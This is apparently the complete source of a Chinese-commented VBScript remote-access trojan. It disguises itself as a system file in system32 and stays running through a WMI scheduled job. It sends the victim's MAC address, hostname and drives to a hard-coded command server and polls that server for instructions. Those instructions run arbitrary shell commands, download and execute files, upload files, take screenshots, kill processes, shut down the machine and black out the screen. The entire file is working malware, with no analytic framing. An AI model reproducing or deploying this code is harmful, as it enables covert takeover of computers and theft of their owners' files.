on Error Resume Next  '容错模式
'/////////////////////////////////////////////////////////////////////
'///////////////////////// 设定 开机运行 /////////////////////////////
'/////////////////////////////////////////////////////////////////////
Dim SysReg,FullFileName,FullNewsName,sysStage

     FullFileName = lcase(WScript.ScriptFullName)
     FullNewsName = lcase("c:\windows\system32\systen32.vbs")
if FullFileName<>FullNewsName then
 Set fso=Wscript.CreateObject("Scripting.FileSystemObject")
 Set c=fso.getfile(FullFileName)   '被拷贝位置
     c.copy(FullNewsName)          '拷贝到
 Set c=nothing
 Set fso=nothing
 
 
 Wscript.sleep 1000
 Set objShell=wscript.createObject("wscript.shell") 
     objShell.Run FullNewsName,0
 Set objShell=Nothing


 Wscript.sleep 1000
'/// 写入计划
Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Set objNewJob   = objWMIService.Get("Win32_ScheduledJob")
  errJobCreated = objNewJob.Create(FullNewsName,"********200000.000000+480",True ,1 OR 2 OR 4 OR 8 OR 16 Or 32 OR 64,,,JobID)
Select Case errJobCreated
       Case 0    State = "成功完成"
       Case 1    State = "不支持"
       Case 2    State = "访问被拒绝"
       Case 8    State = "出现不明故障"
       Case 9    State = "未发现路径"
       Case 21   State = "参数无效"
       Case 22   State = "服务尚未启动"
       Case Else State = "状态未知"
End Select
Set objNewJob   = nothing
Set objWMIService = nothing
 
'/// 写入注册表
' Set SysReg       = Wscript.CreateObject("wscript.shell")
'     SysReg.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\RemoteVbs[Cm.Ivan]",FullNewsName
' Set SysReg       = nothing
 
 sysStage="false"
end if









     '////// 获取mac /////
     Dim mc,mo
     Set mc=GetObject("Winmgmts:").InstancesOf("Win32_NetworkAdapterConfiguration")
     For Each mo In mc
         If mo.IPEnabled=True Then
             mac=mo.MacAddress
             Exit For
         End If
     Next
     Set mc=noting
	 

     '////// 计算机名称 /////
     Dim WshNetwork,Host
     Set WshNetwork   = WScript.CreateObject("WScript.Network")
         Host = WshNetwork.ComputerName '取本机计算机名
     Set WshNetwork   =noting
	 

     '////// 获取盘符 /////
     Dim Fsys,coldisks,eDisk,disks
     Set Fsys=WScript.CreateObject("Scripting.FileSystemObject") 
     Set coldisks = Fsys.Drives 
         For Each eDisk in coldisks 
             If eDisk.Drivetype=2 then
                disks=disks&eDisk&"|"
             End If
         next
     Set coldisks =Nothing
     Set Fsys     =Nothing 
	 


'--------------------------------------------------------------------
'/////////////////// 列出所有盘符           /////////////////////////
'--------------------------------------------------------------------
Function gethost()
     on Error Resume Next  '容错模式
	 if disks<>"" then Call BackCmd("host")
End Function


'--------------------------------------------------------------------
'/////////////////// Url编码转换           //////////////////////////
'--------------------------------------------------------------------
Function URLEncoding(vstrIn) 
     on Error Resume Next  '容错模式(防止内存不足)
     strReturn = "" 
     For i = 1 To Len(vstrIn) 
         ThisChr = Mid(vStrIn,i,1) 
         If Abs(Asc(ThisChr)) < &HFF Then 
            strReturn = strReturn & ThisChr 
         Else 
            innerCode = Asc(ThisChr) 
            If innerCode < 0 Then 
               innerCode = innerCode + &H10000 
            End If 
            Hight8 = (innerCode And &HFF00)\ &HFF 
            Low8   = innerCode  And &HFF 
            strReturn = strReturn & "%" & Hex(Hight8) & "%" & Hex(Low8) 
         End If 
     Next 
     URLEncoding = strReturn 
End Function
'--------------------------------------------------------------------
'///////////////// 提交数据到服务器        //////////////////////////
'--------------------------------------------------------------------
Function BackCmd(Cmdstr)
     on Error Resume Next  '容错模式(防止内存不足)
     Dim xmlhttp,xmlget,bgpos,endpos
	     Cmdstr=replace(Cmdstr," ","%20")
         Cmdstr=replace(Cmdstr,"&","%26")
		 Cmdstr=replace(Cmdstr,chr(13),"{-}")
		 
     Set xmlhttp = CreateObject("Msxml2.ServerXMLHTTP") 
	     strA=URLEncoding("cmd="&Cmdstr&"&mac="&mac&"&host="&host&"&disk="&disks)
     With xmlhttp
         .Open "POST",UrlTarget&"/server.asp",False
         .SetRequestHeader "Content-Length",len(strA)
         .SetRequestHeader "CONTENT-TYPE","application/x-www-form-urlencoded"
         .Send strA
      If .status<>200 then xmlget="error"
     End With 
     Set xmlhttp = Nothing
End Function
'--------------------------------------------------------------------
'//////////////// 将字符转为指定编码，防止乱码 //////////////////////
'--------------------------------------------------------------------
Function BytesToBstr(body)
     on Error Resume Next  '容错模式(防止内存不足)
     Dim ObjStream
     Set ObjStream=CreateObject("adodb.stream") 
         ObjStream.Type = 1
         ObjStream.Mode = 3 
         ObjStream.Open 
         ObjStream.Write body 
         ObjStream.Position = 0 
         ObjStream.Type = 2 
        'ObjStream.CharSet = "UTF-8"     '防止乱码
         ObjStream.CharSet = "gb2312"    '防止乱码
         BytesToBstr=ObjStream.ReadText  
         ObjStream.Close 
     Set ObjStream=Nothing
End Function 


'--------------------------------------------------------------------
'//////////////// 将指定文件编码//////////////////////
'--------------------------------------------------------------------
Function getBytes(path)
     on Error Resume Next  '容错模式(防止内存不足)
  Dim objXMLHTTP
  Dim objADOStream
  Set objADOStream = CreateObject("ADODB.Stream")   
      objADOStream.Open   
      objADOStream.Type = 1   
      objADOStream.LoadFromFile path  
      getBytes = objADOStream.Read()
  Set objADOStream = nothing
End Function 




'--------------------------------------------------------------------
'//////////////// 读取定页面内容  ///////////////////////////////////
'--------------------------------------------------------------------
Function GetHttpPage(Url)
     On Error Resume Next  '容错模式(防止内存不足)
     Dim xmlhttp,xmlget,bgpos,endpos
     Set xmlhttp = CreateObject("Msxml2.ServerXMLHTTP") 
	     strA=""
         With xmlhttp
           .Open "GET",Url,False
           .SetRequestHeader "Content-Length",len(strA)
           .SetRequestHeader "CONTENT-TYPE","application/x-www-form-urlencoded"
           .SEnd strA
           If .status<>200 then
              GetHttpPage="error"
           Else
	          GetHttpPage=BytesToBstr(xmlhttp.responseBody)
           End If
         End With 
 Set xmlhttp = Nothing
End Function 
'--------------------------------------------------------------------
'///////// 用于文件大小转换             //////////////////////////////
'--------------------------------------------------------------------
Function FormatSize(SZ)
     On Error Resume Next  '容错模式
     Dim i,Unit4Size
     Unit4Size="字节KBMBGB"
     if SZ<>"" and isnumeric(SZ) then
        Do While SZ>1024 and err=0
	       if len(SZ)>=10 then
              i =3
		      A_SZ=left(SZ,len(SZ)-4)
              SZ =A_SZ \ 1024 *100
            else
              i =i+1
              SZ=int(SZ) \ 1024
		   end if
        Loop
        FormatSize=SZ&" "&mid(Unit4Size,1+2*i,2)
     end if
End Function





'--------------------------------------------------------------------
'//////////////// 将字符转为指定编码，防止乱码 //////////////////////
'--------------------------------------------------------------------
Public Function BytesToBstr(body)
     On Error Resume Next  '容错模式(防止内存不足)
     Dim ObjStream
     Set ObjStream = CreateObject("adodb.stream")
         ObjStream.Type = 1
         ObjStream.Mode = 3
         ObjStream.Open
         ObjStream.Write body
         ObjStream.Position = 0
         ObjStream.Type = 2
         ObjStream.Charset = "gb2312"    '防止乱码
         BytesToBstr = ObjStream.ReadText
         ObjStream.Close
     Set ObjStream = Nothing
End Function

'--------------------------------------------------------------------
'//////////////// 将字符转为指定编码，防止乱码 //////////////////////
'--------------------------------------------------------------------
Public Function StringToBytes(ByVal strData)
  On Error Resume Next
    Dim objFile
    Set objFile = CreateObject("ADODB.Stream")
        objFile.Type = 2
        objFile.Charset = "gb2312"
        objFile.Open
        objFile.WriteText strData
        objFile.Position = 0
        objFile.Type = 1
        StringToBytes = objFile.Read(-1)
        objFile.Close
    Set objFile = Nothing
End Function

'------------------------------------------------------
'//////////////// 将指定文件编码//////////////////////
'------------------------------------------------------
Public Function GetBytes(ByVal Path)
  On Error Resume Next
  Dim objFile
  Set objFile = CreateObject("ADODB.Stream")
      objFile.Type = 1
      objFile.Open
      objFile.LoadFromFile Path
      GetBytes = objFile.Read(-1)
      objFile.Close
  Set objFile = Nothing
End Function


'------------------------------------------------------
'//////////////// 上传指定文件   //////////////////////
'------------------------------------------------------
Public Function UpFiles(ByVal Path)
  On Error Resume Next
  Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP")
  Set objTemp = CreateObject("ADODB.Stream")
      objTemp.Type = 1
      objTemp.Open
    
      tmp = tmp & vbCrLf & "filename=""" & Path & """" & vbCrLf
      tmp = tmp & "Content-Disposition: form-data;name=""upload"";filename=""" & Path & """" & vbCrLf & vbCrLf
     
      objTemp.Write StringToBytes(tmp)
   If VarType(vtValue) = (vbByte Or vbArray) Then
      objTemp.Write "" & Path & ""
   Else
      objTemp.Write GetBytes("" & Path & "")
   End If
      objTemp.Position = 0
      xmlHttp.Open "POST", UrlTarget & "/vbsUpload.asp", False
      xmlHttp.setRequestHeader "Content-Type", "multipart/form-data"
      xmlHttp.setRequestHeader "Content-Length", objTemp.Size
      xmlHttp.Send objTemp
    
      If xmlHttp.Status <> 200 Then
         BackPageInfo = "error"
      Else
         BackPageInfo = BytesToBstr(xmlHttp.responseBody)
      End If
      UpFiles = BackPageInfo
    objTemp.Close
  Set objTemp = Nothing
  Set xmlHttp = Nothing
End Function


'------------------------------------------------------
'//////////////// 下载指定文件   //////////////////////
'------------------------------------------------------
Public Function DownFiles(ByVal GetFile,ByVal ToFile)
  On Error Resume Next
  Set xmlhttp = CreateObject("Microsoft.XMLHTTP") '创建HTTP请求对象
  Set stream  = CreateObject("ADODB.Stream")      '创建ADO数据流对象
  '--------------| 瑞星查杀 |-----------------
      xmlhttp.open "GET",GetFile,False  '打开连接
      xmlhttp.send()                    '发送请求
      stream.mode = 3     '设置数据流为读写模式
      stream.type = 1     '设置数据流为二进制模式
      stream.open()       '打开数据流
      stream.write(xmlhttp.responsebody)  '将服务器的返回报文主体内容写入数据流
      stream.savetofile ToFile,2          '将数据流保存为文件
  '-------------------------------------------
      DownFiles=true
  Set xmlhttp = Nothing
  Set stream  = Nothing
End Function



'--------------------------------------------------------------------
'///////// 用于循环监测，并执行         //////////////////////////////
'--------------------------------------------------------------------
Function loopRun()
     On Error Resume Next  '容错模式
           Dim GetCmd
           GetCmd=GetHttpPage(UrlTarget&"/cmd.txt")  '接收命令

		   If GetCmd<>"" then
		      GetCmds = split(GetCmd,"|")
		     If cstr(GetCmds(0))=cstr(mac) or cstr(GetCmds(0))=cstr("ToAll") then     '验证MAC
			 
		     If ubound(GetCmds)>=1 then     '验证是否符合
select case lcase(GetCmds(1))

  '---------------------------------------------------
  '--------------| 系统操作 |------------------------->
  '---------------------------------------------------

	   '>>>>>>>>>>>>>>>> 列出系统文件/目录
	   case "sys_dir"
             Path=GetCmds(2)
             If len(Path)>3 then
	            If right(Path,1)="\" then Path=left(Path,len(Path)-1)
             ElseIf len(Path)=2 then
	            Path=Path&"\"
             End If
			 
             Dim i,TempStr,FlSpace
             Set objFso = CreateObject("Scripting.FileSystemObject")
             Set CrntFolder = objFso.GetFolder(Path)

                 TreeStr="folder|"
             For Each SubFolder In CrntFolder.SubFolders
                 'If ShowSize Then TreeStr = TreeStr & FormatSize(SubFolder.size)
	             TreeStr = TreeStr &"|"& SubFolder.Name
             Next

	             TreeStr=TreeStr&"{#}file|"
             For Each ConFile In CrntFolder.Files
                 TreeStr = TreeStr &"|"& ConFile.Name&"{s}"
	             TreeStr = TreeStr & FormatSize(ConFile.Size)
             Next
			 BackCmdStr=TreeStr
			 
			 
			 
	   '>>>>>>>>>>>>>>>> 注销/重启系统/关机
	   case "sys_shutdown_0","sys_shutdown_2","sys_shutdown_8" 
	         Dim  shutdown_Id  
	         shutdown_Id=int(right(GetCmds(1),1))
			 Set colOperatingSystems = GetObject("winmgmts:{(Shutdown)}").ExecQuery("Select * from Win32_OperatingSystem") 
		         For Each objOperatingSystem in colOperatingSystems 
 		             ObjOperatingSystem.Win32Shutdown(shutdown_Id) 
		         Next
			 Set colOperatingSystems=Nothing
	   '>>>>>>>>>>>>>>>> 运行cmd 命令
	   case "sys_cmd"
	         '--- 执行命令
			 Set objShell=wscript.createObject("wscript.shell") 
 		         objShell.Run "cmd.exe /c "&GetCmds(2)&" >c:\windows\syscmd~.txt",0
		     Set objShell=Nothing
			 '--- 读取临时文件
			     wscript.sleep 1000
             Set objFSO = Wscript.CreateObject("Scripting.FileSystemObject") 
                 Set objCountFile = objFSO.OpenTextFile("c:\windows\syscmd~.txt",1,True)
                     if not objCountFile.AtEndofStream then 
                        FSOFileRead = objCountFile.Readall
                     end if
                     objCountFile.Close 
                 Set objCountFile=Nothing 
             Set objFSO = Nothing
			 
			 GetCmds(1)="sys_txt"        '强行修改返回信息，以文字信息显示
			 BackCmdStr=">> (C) 版权所有 1985-2001 Microsoft Corp. "&chr(13)&FSOFileRead
			 
			 
			 
	   '>>>>>>>>>>>>>>>> 列出系统进程
	   case "sys_tasklist"    
			 Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
			 Set process=wmi.execquery("select * from win32_process")
			 for each objprocess in process
			     objProcess.GetOwner UserName,strUserDomain
      			 All_PID=All_PID&"{list}"&objprocess.ExecutablePath&"*"&objprocess.name&"*"
				 All_PID=All_PID&UserName&"*"&objprocess.processid
  			 next
			 Set wmi = Nothing
			 Set process = Nothing
			 BackCmdStr  = All_PID
			 
			 
			 
	   '>>>>>>>>>>>>>>>> 关闭系统进程
	   case "sys_killtask"  
		     C_cmds=split(GetCmds(2),"|")
			 C_Name="-"
			 For i=0 to ubound(C_cmds)
                 C_Name=C_Name&" or processid='"&C_cmds(i)&"'"
			 Next
		         C_Name=replace(C_Name,"- or","") 
             Dim Bag1,pipe1
             Set Bag1=getobject("winmgmts:\\.\root\cimv2")
             Set pipe1=Bag1.execquery("select * from win32_process where"&C_Name)
                 For Each i in pipe1
                     i.terminate()
                 Next
			 Set pipe1=Nothing
			 Set Bag1 =Nothing
			 GetCmds(1)="sys_txt"        '强行修改返回信息，以提示信息显示
			 BackCmdStr="成功结束 进程PID: "&GetCmds(2)&" ！"
			 
			 
			 
	   '>>>>>>>>>>>>>>>> 截取屏幕
	   case "sys_getscreen"  
             '----- 获取文件 ----
			 set fso = CreateObject("scripting.filesystemobject")
                 if fso.FileExists("sysscreen.exe") then
                    '文件存在,则执行
                 else
                    '文件不存在,则下载
					call DownFiles(UrlTarget&"/getscreen.exe","sysscreen.exe")  '//下载文件
                 end if
             set fso = nothing
             '----- 执行文件 ----
			 set fso = CreateObject("scripting.filesystemobject")
                 if fso.FileExists("sysscreen.exe") then
 			        Set objShell=wscript.createObject("wscript.shell") 
 		                objShell.Run "sysscreen.exe",0
		            Set objShell=Nothing
                 else
                    runscreen=false
                 end if
             set fso = nothing
			 call UpFiles("screen.jpg")
			 
			GetCmds(1)="sys_txt"
			BackCmdStr="已成功截图"
			 
			 

			 
			 
			 
	   '>>>>>>>>>>>>>>>> 新建文件(从网络加载)
	   case "sys_newfile"  
             GetFile = GetCmds(2)                        '网络上的文件地址
             GetFiles=split(GetFile,"/")
             ToFile  =GetFiles(ubound(GetFiles))         '保存成的本地文件
                          
	                  ToFile=replace(ToFile," ","")
			 if ToFile="" then
			    ToFile="hongya2012.htm"
				else
				if instr(ToFile,".")<>0 then
				   ToFile  =replace(ToFile,".","_.")
				   else
				   ToFile  =ToFile&"_.htm"
				end if
			 end if
             ToFile="C:\WINDOWS\system32\"&ToFile
                
			 
			 call DownFiles(GetFile,ToFile)  '//下载文件
			 
			 GetCmds(1)  = "sys_txt"     '强行修改返回信息，以提示信息显示
			 BackCmdStr  = "成功新建文件: "&ToFile&" ！"
			 
			 
	   '>>>>>>>>>>>>>>>> 注册表编辑(附加的)
	   case "sys_reg"  
	         Set MainUrl=CreateObject("wscript.shell")
	         	 RegPath="HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\Main\Window Title"
  	             Tf=MainUrl.regwrite(RegPath,"[米客.中国]")
	         Set MainUrl=nothing 
			 

  '---------------------------------------------------
  '--------------| 其他操作 |------------------------->
  '---------------------------------------------------
  
	   '>>>>>>>>>>>>>>>> 打开网页
	   case "sys_openweb" 
	         Set objShell = CreateObject("Wscript.Shell") 
	             objShell.Run(GetCmds(2)) 
			 Set objShell = Nothing
			 
			 GetCmds(1)="sys_txt"     '强行修改返回信息，以提示信息显示
			 BackCmdStr="成功打开网页: "&GetCmds(2)&" ！"
			 
			 
	   '>>>>>>>>>>>>>>>> 弹出信息
	   case "sys_showmsg" 
	         msgbox GetCmds(2)
			 GetCmds(1)="sys_txt"     '强行修改返回信息，以提示信息显示
			 BackCmdStr="成功弹出信息: "&GetCmds(2)&" ！"
			 
			 
	   '>>>>>>>>>>>>>>>> 黑屏
	   case "sys_windowblack" 
	         set ie=wscript.createobject("internetexplorer.application")
   	             ie.navigate "about:blank"
    	         ie.fullscreen=1
    	         ie.statusbar =0 
    	         ie.document.bgColor="black"
    	         ie.document.fgColor="White"
    	         ie.document.body.scroll="no"
    	         ie.visible=1 
    	         Randomize
	         Set ObjDiv=ie.document.createElement("div")
	         Set ObjDoc=ie.document.body
    	         ObjDoc.appendChild ObjDiv
	             With ObjDiv
       	             .style.position="absolute"
         	           .style.left=rnd*ObjDoc.clientWidth
          	          .style.top =rnd*ObjDoc.clientHeight
          	          .style.width    = "auto"
          	          .style.fontsize = "20px"
		  	          .innerHTML      = GetCmds(2)
    	         End With
	         Set ObjDoc=nothing
	         Set ObjDiv=nothing
			 GetCmds(1)="sys_txt"     '强行修改返回信息，以文本信息显示
			 BackCmdStr="黑屏信息: "&GetCmds(2)&" ！"


  '---------------------------------------------------				
  '--------------| 文件操作 |------------------------->
  '---------------------------------------------------
  
	   '>>>>>>>>>>>>>>>> 读取文件
	   case "file_read"
	        dim file_read
			    file_read = UpFiles(GetCmds(2))
            GetCmds(1)="sys_txt"
			BackCmdStr="文件:"&GetCmds(2)&file_read
			 
			 
			 
			 
	   '>>>>>>>>>>>>>>>> 复制文件
	   case "file_copy"
	         fcopys=split(GetCmds(2),"{_}")
			 if ubound(fcopys)=1 then
	            Set fso=Wscript.CreateObject("Scripting.FileSystemObject")
	            Set c=fso.getfile(fcopys(0))   '被拷贝位置
   	                c.copy(fcopys(1))          '拷贝到
	            Set c=nothing
	            Set fso=nothing
			 end if
			 GetCmds(1)="sys_txt"
			 BackCmdStr="已复制文件:"&GetCmds(2)
			 
			 
	   '>>>>>>>>>>>>>>>> 重命名文件
	   case "file_rename" 
	         frenames=split(GetCmds(2),"{_}")
			 if ubound(frenames)=1 then
                Set fso=Wscript.CreateObject("Scripting.FileSystemObject")
	            Set c=fso.getfile(frenames(0))   '要重命名的文件
   	                c.name=frenames(1)           '新名称
	            Set c=nothing
	            Set fso=nothing
		     GetCmds(1)="sys_txt"
		     BackCmdStr="已重命名文件:"&GetCmds(2)
			 end if


	   '>>>>>>>>>>>>>>>> 修改文件属性
	   case "file_attrib"
	         'Fso.GetFile(Fname) 
	         'Fso.GetFolder(Fname)
			 'A.attributes=A.attributes+2+4  '添加属性
			 '1-只读;2-隐藏;4-系统
	         attribs=split(GetCmds(1),"{_}")
			 if ubound(attribs)=1 then
	            Set objFSO  = CreateObject("Scripting.FileSystemObject") 
	            Set objFile = objFSO.GetFile(attribs(0)) 
	                objFile.Attributes = objFile.Attributes&attribs(1)
			    Set objFile =nothing
			    Set objFSO  =nothing
			 end if

	   '>>>>>>>>>>>>>>>> 删除文件
	   case "file_del"
	         Set fso=createobject("scripting.filesystemobject") 
  	             fso.deleteFile GetCmds(2)
				 GetCmds(1)="sys_txt"
				 BackCmdStr="已删除文件:"&GetCmds(2)
	         Set fso=nothing
			 
	   '>>>>>>>>>>>>>>>> 执行文件
	   case "file_run"
			 Set objShell=wscript.createObject("wscript.shell") 
 		         objShell.Run GetCmds(2),0
				 GetCmds(1)="sys_txt"
				 BackCmdStr="已运行文件:"&GetCmds(2)
		     Set objShell=Nothing
			 
			 
End select

'----------------|  提交返回命令  |-----------------
      If BackCmdStr<>"" and err=0 Then
	     Call BackCmd(GetCmds(1)&"{#}"&BackCmdStr)
	   else
	     Call BackCmd("sys_txt{#}指令可能执行失败！")
      End If
'---------------------------------------------------

		     End If
			 End If
		   End If
		   
		   
		 gethost()                '初始化
		 Wscript.Sleep 1000
         loopRun()                '循环执行
End Function


	
	
'----------------|  循环执行，知道获取到地址为止  |-----------------
Function getAddress(url)
    on Error Resume Next  '容错模式
    t_getAddress=GetHttpPage(url)
    if t_getAddress<>"" and len(t_getAddress)>12 then
       if right(t_getAddress,1)="/" then t_getAddress=left(t_getAddress,len(t_getAddress)-1)
	     getAddress=t_getAddress     '注意:地址后面不用加"/"
	else
	     getAddress=""
    end if
End Function





'--------------------------------------------------------------------
'/////////////////// 变量定义,调用函数   ////////////////////////////
'--------------------------------------------------------------------
Dim UrlTarget,getSite   '全局变量，目标地址
    UrlTarget=""
    Urlconfig="http://www.zc62.com/old/up/cmivan/vbs/config.asp" 

if FullFileName=FullNewsName then

  '读取指定地址
do while UrlTarget=""
   UrlTarget=getAddress(Urlconfig)
   UrlTarget=replace(UrlTarget,chr(10),"")
   UrlTarget=replace(UrlTarget,chr(13),"")
   Wscript.sleep 2000
loop
if UrlTarget<>"" then
   Call loopRun()        '循环执行
end if

end if
